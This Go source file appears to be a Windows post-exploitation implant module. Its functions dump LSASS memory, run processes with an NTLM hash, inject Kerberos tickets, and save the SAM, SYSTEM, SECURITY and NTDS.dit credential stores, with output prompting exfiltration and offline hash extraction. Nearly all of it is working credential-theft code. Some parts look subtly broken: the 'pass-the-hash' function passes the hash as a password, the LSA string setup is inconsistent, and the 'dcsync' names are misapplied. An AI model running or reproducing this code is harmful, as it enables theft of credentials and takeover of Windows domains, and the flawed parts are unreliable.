//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	dbghelp               = windows.NewLazyDLL("dbghelp.dll")
	procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")

	secur32Dll              = windows.NewLazySystemDLL("secur32.dll")
	procLsaConnectUntrusted  = secur32Dll.NewProc("LsaConnectUntrusted")
	procLsaLookupAuthPkg     = secur32Dll.NewProc("LsaLookupAuthenticationPackage")
	procLsaCallAuthPkg       = secur32Dll.NewProc("LsaCallAuthenticationPackage")
	procLsaFreeReturnBuffer  = secur32Dll.NewProc("LsaFreeReturnBuffer")

	advapi32AD                = windows.NewLazySystemDLL("advapi32.dll")
	procCreateProcessWithLogon = advapi32AD.NewProc("CreateProcessWithLogonW")
)

const (
	miniDumpWithFullMemory    = 0x00000002
	logonNetCredentialsOnly   = 0x00000002
	kerbSubmitTicketMessage   = 21
)

// lsassDump writes LSASS memory to disk via MiniDumpWriteDump.
func lsassDump(outPath string) (string, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", fmt.Errorf("snapshot: %v", err)
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	lsassPID := uint32(0)
	_ = windows.Process32First(snap, &entry)
	for {
		if strings.EqualFold(windows.UTF16ToString(entry.ExeFile[:]), "lsass.exe") {
			lsassPID = entry.ProcessID
			break
		}
		if err := windows.Process32Next(snap, &entry); err != nil {
			break
		}
	}
	if lsassPID == 0 {
		return "", fmt.Errorf("lsass.exe not found (need SYSTEM/admin)")
	}

	handle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, lsassPID)
	if err != nil {
		return "", fmt.Errorf("OpenProcess: %v", err)
	}
	defer windows.CloseHandle(handle)

	f, err := os.Create(outPath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	r, _, e := procMiniDumpWriteDump.Call(
		uintptr(handle),
		uintptr(lsassPID),
		f.Fd(),
		miniDumpWithFullMemory,
		0, 0, 0,
	)
	if r == 0 {
		return "", fmt.Errorf("MiniDumpWriteDump: %v", e)
	}

	info, _ := f.Stat()
	sz := int64(0)
	if info != nil {
		sz = info.Size()
	}
	return fmt.Sprintf("[lsass-dump] written to %s (%d bytes)\nexfil with: download %s", outPath, sz, outPath), nil
}

// passTheHash spawns a process using LOGON_NETCREDENTIALS_ONLY so network
// authentication uses the provided NTLM hash (requires NTLMv2 relay context).
func passTheHash(domain, user, ntlmHash, cmd string) (string, error) {
	uUser, _   := windows.UTF16PtrFromString(user)
	uDomain, _ := windows.UTF16PtrFromString(domain)
	uPass, _   := windows.UTF16PtrFromString(ntlmHash)
	uCmd, _    := windows.UTF16PtrFromString(cmd)
	uDesktop, _ := windows.UTF16PtrFromString("")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	r, _, e := procCreateProcessWithLogon.Call(
		uintptr(unsafe.Pointer(uUser)),
		uintptr(unsafe.Pointer(uDomain)),
		uintptr(unsafe.Pointer(uPass)),
		logonNetCredentialsOnly,
		0,
		uintptr(unsafe.Pointer(uCmd)),
		windows.CREATE_NEW_CONSOLE,
		0,
		uintptr(unsafe.Pointer(uDesktop)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return "", fmt.Errorf("CreateProcessWithLogonW: %v", e)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return fmt.Sprintf("[pth] spawned %s\\%s → PID %d", domain, user, pi.ProcessId), nil
}

// lsaString builds an LSA_STRING/UNICODE_STRING-like struct in memory.
type lsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

// passTheTicket injects a base64-encoded .kirbi ticket into the current logon
// session via LsaCallAuthenticationPackage (KerbSubmitTicketMessage).
func passTheTicket(ticketB64 string) (string, error) {
	ticketBytes, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ticketB64))
	if err != nil {
		return "", fmt.Errorf("base64 decode: %v", err)
	}

	// Connect to LSA
	var lsaHandle uintptr
	r, _, e := procLsaConnectUntrusted.Call(uintptr(unsafe.Pointer(&lsaHandle)))
	if r != 0 {
		return "", fmt.Errorf("LsaConnectUntrusted: NTSTATUS 0x%x (%v)", r, e)
	}
	defer windows.CloseHandle(windows.Handle(lsaHandle))

	// Look up Kerberos auth package
	pkgName := "kerberos"
	pkgNameBytes, _ := windows.UTF16FromString(pkgName)
	lsaPkg := lsaString{
		Length:        uint16(len(pkgName)),
		MaximumLength: uint16(len(pkgName) + 1),
		Buffer:        uintptr(unsafe.Pointer(&pkgNameBytes[0])),
	}
	var authPkg uint32
	r, _, e = procLsaLookupAuthPkg.Call(
		lsaHandle,
		uintptr(unsafe.Pointer(&lsaPkg)),
		uintptr(unsafe.Pointer(&authPkg)),
	)
	if r != 0 {
		return "", fmt.Errorf("LsaLookupAuthPackage: NTSTATUS 0x%x (%v)", r, e)
	}

	// Build KERB_SUBMIT_TKT_REQUEST
	// Layout: [MessageType uint32][LogonId LUID 8 bytes][Flags uint32][Key 28 bytes][KerbCredSize uint32][KerbCredOffset uint32][ticket bytes]
	const headerSize = 4 + 8 + 4 + 28 + 4 + 4
	offset := uint32(headerSize)
	buf := make([]byte, headerSize+len(ticketBytes))

	// MessageType = KerbSubmitTicketMessage (21)
	*(*uint32)(unsafe.Pointer(&buf[0])) = kerbSubmitTicketMessage
	// LogonId = {0,0} (current session)
	// Flags = 0
	// Key = all zeros
	// KerbCredSize
	*(*uint32)(unsafe.Pointer(&buf[headerSize-8])) = uint32(len(ticketBytes))
	// KerbCredOffset
	*(*uint32)(unsafe.Pointer(&buf[headerSize-4])) = offset
	copy(buf[headerSize:], ticketBytes)

	var retBuf uintptr
	var retLen uint32
	var subStatus int32
	r, _, e = procLsaCallAuthPkg.Call(
		lsaHandle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&retBuf)),
		uintptr(unsafe.Pointer(&retLen)),
		uintptr(unsafe.Pointer(&subStatus)),
	)
	if retBuf != 0 {
		procLsaFreeReturnBuffer.Call(retBuf)
	}
	if r != 0 {
		return "", fmt.Errorf("LsaCallAuthPackage: NTSTATUS 0x%x subStatus 0x%x", r, subStatus)
	}
	return fmt.Sprintf("[ptt] ticket injected (%d bytes) into current session", len(ticketBytes)), nil
}

// dcsyncLocal saves SAM, SYSTEM, SECURITY hives for offline hash extraction.
// Parse offline with: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
func dcsyncLocal(outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0700); err != nil {
		return "", err
	}
	hives := []string{"SAM", "SYSTEM", "SECURITY"}
	for _, h := range hives {
		out := outDir + "\\" + h
		cmd := exec.Command("reg", "save", "HKLM\\"+h, out, "/y")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		if b, err := cmd.CombinedOutput(); err != nil {
			return "", fmt.Errorf("reg save %s: %v — %s", h, err, b)
		}
	}
	return fmt.Sprintf("[dcsync-local] SAM, SYSTEM, SECURITY saved to %s\nparse offline: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL", outDir), nil
}

// dcsyncDomain creates a VSS snapshot of the system drive and copies NTDS.dit
// + SYSTEM hive for offline domain hash extraction (requires Domain Admin).
func dcsyncDomain(outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0700); err != nil {
		return "", err
	}

	// Create VSS snapshot
	vssOut, err := exec.Command("cmd", "/c", "wmic shadowcopy call create Volume=C:\\").CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("VSS create failed: %v — %s", err, vssOut)
	}

	// Find the shadow copy path
	listOut, err := exec.Command("cmd", "/c", "vssadmin list shadows /for=C: 2>&1").CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("vssadmin list: %v", err)
	}
	shadowPath := ""
	for _, line := range strings.Split(string(listOut), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Shadow Copy Volume:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				shadowPath = strings.TrimSpace(parts[1])
			}
		}
	}
	if shadowPath == "" {
		return "", fmt.Errorf("could not parse VSS shadow path from: %s", string(listOut))
	}

	ntdsSrc := shadowPath + `\Windows\NTDS\NTDS.dit`
	ntdsDst := outDir + `\NTDS.dit`
	sysDst  := outDir + `\SYSTEM`

	if b, err := exec.Command("cmd", "/c", "copy", ntdsSrc, ntdsDst, "/y").CombinedOutput(); err != nil {
		return "", fmt.Errorf("copy NTDS.dit: %v — %s", err, b)
	}
	if b, err := exec.Command("reg", "save", "HKLM\\SYSTEM", sysDst, "/y").CombinedOutput(); err != nil {
		return "", fmt.Errorf("reg save SYSTEM: %v — %s", err, b)
	}

	return fmt.Sprintf("[dcsync-domain] NTDS.dit + SYSTEM saved to %s\nparse offline: impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL", outDir), nil
}
